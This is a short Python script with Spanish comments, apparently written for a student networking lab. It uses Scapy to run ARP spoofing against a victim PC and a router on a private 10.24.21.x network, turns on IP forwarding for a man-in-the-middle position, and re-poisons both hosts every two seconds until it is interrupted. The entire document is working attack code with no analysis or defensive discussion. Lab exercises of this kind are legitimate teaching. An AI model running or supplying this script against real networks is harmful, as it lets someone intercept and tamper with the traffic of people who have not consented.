import sys
import os
import time
from scapy.all import *

# ---- CONFIGURACIÓN DE VARIABLES CON TU MATRÍCULA (2024-2421) ----
target_ip = "10.24.21.3"       # IP de tu PC1 (Víctima)
gateway_ip = "10.24.21.1"      # IP de tu Router (Gateway)
interface = "eth0"             # Tu interfaz de red en Kali
# -----------------------------------------------------------------

def spoof(target_ip, host_ip):
    # Forzamos el envío usando las direcciones MAC fijas reales de la red
    if target_ip == "10.24.21.3":
        v_mac = "00:50:79:66:68:00"  # MAC real de tu PC1
    else:
        v_mac = "ca:01:53:fc:00:00"  # MAC real de tu Router c7200
        
    # Creamos el paquete ARP (op=2 significa ARP Reply)
    packet = ARP(op=2, pdst=target_ip, hwdst=v_mac, psrc=host_ip)
    
    # Enviamos la trama especificando la interfaz física
    send(packet, iface=interface, verbose=False)

# ACTIVAR EL REENVÍO DE TRÁFICO (Crucial para el ataque Man-in-the-Middle)
if os.geteuid() != 0:
    sys.exit("[-] Ejecuta este script usando sudo.")

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("[+] Iniciando envenenamiento ARP (Man-in-the-Middle)...")
print("[+] Kali reenviando paquetes de forma transparente...")

try:
    while True:
        spoof(target_ip, gateway_ip)  # Engañar a la víctima (PC1)
        spoof(gateway_ip, target_ip)  # Engañar al router (R1)
        time.sleep(2)                 # Mantener el envenenamiento activo
except KeyboardInterrupt:
    # Desactivar el forwarding al salir para limpiar la red
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("\n[-] Ataque detenido y forwarding desactivado de forma segura.")
